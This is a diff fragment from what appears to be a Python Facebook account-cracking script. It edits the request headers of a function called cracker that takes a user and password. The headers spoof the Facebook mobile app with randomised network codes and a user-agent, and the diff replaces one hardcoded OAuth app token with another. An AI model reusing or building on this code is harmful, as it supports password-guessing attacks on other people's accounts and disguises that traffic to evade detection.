@@ -190,7 +190,7 @@ def cracker(user,pwx,tl):
 				"content-type": "application/x-www-form-urlencoded",
 				"x-fb-sim-hni": str(random.randint(2e4,4e4)),
 				"x-fb-connection-type": "unknown",
-				"Authorization": "OAuth 748875593606395|gSsrrLSGQZmIJM_Ohlks5QnAjNk",
+				"Authorization": "OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32",
 				"user-agent": ua_string,
 				"x-fb-net-hni": str(random.randint(2e4,4e4)),
 				"x-fb-connection-bandwidth": str(random.randint(2e7,3e7)),
